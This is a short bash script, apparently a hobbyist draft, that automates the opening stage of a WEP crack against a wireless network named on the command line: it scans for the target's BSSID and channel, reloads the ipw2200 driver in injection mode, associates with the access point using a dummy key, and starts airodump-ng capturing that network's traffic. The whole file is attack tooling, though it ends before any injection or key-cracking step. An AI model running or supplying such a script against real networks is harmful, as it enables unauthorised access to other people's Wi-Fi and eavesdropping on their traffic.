#!/bin/bash

#dummy script to capture bssid + channel of command line essid...
bssid="nothing"
channel="none"

iwlist eth1 scan > dump.txt

#first, we need to find the line number of the paragraph we want...
ctr=0
while read line
do
	if [[ "$line" =~ "$1" ]]; then
		starta=$(( $ctr - 1 ))
		startc=$(( $ctr + 3 ))
	fi
	let "ctr++"
done < dump.txt
echo $start

#second, now we fetch the raw line data we need...
ctr=0
while read line
do
	if [ "$ctr" == "$starta" ]; then
		bssid=`echo $line | awk -F ": " '{print $2}'`
	elif [ "$ctr" == "$startc" ]; then
		channel=`echo $line | awk -F ":" '{print $2}'`
	fi
	let "ctr++"
done < dump.txt

echo "For ESSID "$1", the bssid is "$bssid" and the channel is "$channel"..."

# test to automate the WEP crack...
# requires a essid on the command line...
# ala, script.sh KIKI

#this is for ipw2200 injection streams...
rmmod ipw2200
modprobe ipw2200 rtap_iface=1

#dummy connect to ap for ipw2200 man mode + connected to ap for aireplay-ng...
iwconfig eth1 ap $bssid
iwconfig eth1 key s:ffffffff
iwconfig eth1 mode managed

#bring up the interfaces...
ifconfig eth1 up
ifconfig rtap0 up

#testy stuff here...
#launch a new konsole & background it...ugh...
konsole --noclose -e airodump-ng --channel $channel --bssid $bssid -w dumpfile rtap0 &


